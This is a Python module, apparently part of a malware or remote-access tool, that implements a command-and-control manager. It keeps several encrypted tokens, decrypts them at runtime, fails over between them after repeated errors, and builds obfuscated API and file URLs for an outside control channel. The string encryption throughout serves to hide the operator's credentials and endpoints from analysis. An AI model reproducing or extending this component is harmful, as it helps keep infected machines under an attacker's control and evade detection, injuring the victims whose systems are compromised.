"""
core/c2.py - Multi-token C2 with failover
"""

import time
import random
import threading
from core.obfuscation import decrypt_string

class C2Manager:
    """Manages multiple C2 tokens with automatic failover"""

    def __init__(self):

        self.tokens = [
            decrypt_string("VgZBXH9pYVJuRVB5M38tOxcCMSEFYhJUNTEJdh1rUjkgfU0NFwEhEzVAPFsAaA=="),
            decrypt_string("VgdKW39paFVjQFB5M38+MRcEFw87P2oAICEGczQLAEoDAS0CNzI1V3cQJQgKVg=="),
            decrypt_string("VgVPWn9lblNrTlB5M38SVycDHF56Z2AMEi0jS0AAJA0Fdh4BGhY8N2otHnQYDQ=="),
        ]

        self.bridges = []

        self.current_token_index = 0
        self.current_bridge_index = 0
        self.failed_attempts = 0
        self.max_failures = 3
        self.lock = threading.Lock()

    def get_current_token(self):
        """Get current active token"""
        with self.lock:
            tok = self.tokens[self.current_token_index]
            return tok.strip() if isinstance(tok, str) else ""

    def get_current_bridge(self):
        """Get current active bridge"""
        with self.lock:
            if not self.bridges: return ""
            brd = self.bridges[self.current_bridge_index]
            return brd.strip() if isinstance(brd, str) else ""

    def report_failure(self):
        """Report a failure and potentially switch tokens"""
        with self.lock:
            self.failed_attempts += 1
            if self.failed_attempts >= self.max_failures:
                self._switch_to_next()
                return True
        return False

    def report_success(self):
        """Reset failure counter on success"""
        with self.lock:
            self.failed_attempts = 0

    def _switch_to_next(self):
        """Switch to next available token"""
        old_token = self.current_token_index

        self.current_token_index = (self.current_token_index + 1) % len(self.tokens)

        new_tk = self.tokens[self.current_token_index]
        print(decrypt_string("NXFKNm4CLgsuFAJRHF5GHBxdFUs6PjIHNFcRVx5dOQ4BWR0FM3EtDXoMGV0eX0gZG0AKDiAlBhY1HA9WLVAIHgtKBUsycQ0pFE1KQxxcESUaWSNRf2QEH3RZRA=="))
        self.failed_attempts = 0

    def get_api_url(self):
        """Get full API URL with current bridge"""
        try:
            from core.bridge_manager import bridge_manager
            route = bridge_manager.get_best_route()
            if route and route.get('api_url'):
                return route['api_url']
        except:
            pass

        bridge = self.get_current_bridge()
        if bridge:
            return bridge + decrypt_string("QVAXHzVhJE0hRhc=")
        return decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdRUFTAkJG1UVAwU=")

    def get_file_url(self):
        """Get file URL with current bridge"""
        try:
            from core.bridge_manager import bridge_manager
            route = bridge_manager.get_best_route()
            if route and route.get('file_url'):
                return route['file_url']
        except:
            pass

        bridge = self.get_current_bridge()
        if bridge:
            return bridge + decrypt_string("QVQRByt+Ow0uDFpFXUJXBw==")
        return decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdREDVBcWBBUaSUgWYSpoHw==")

c2_manager = C2Manager()
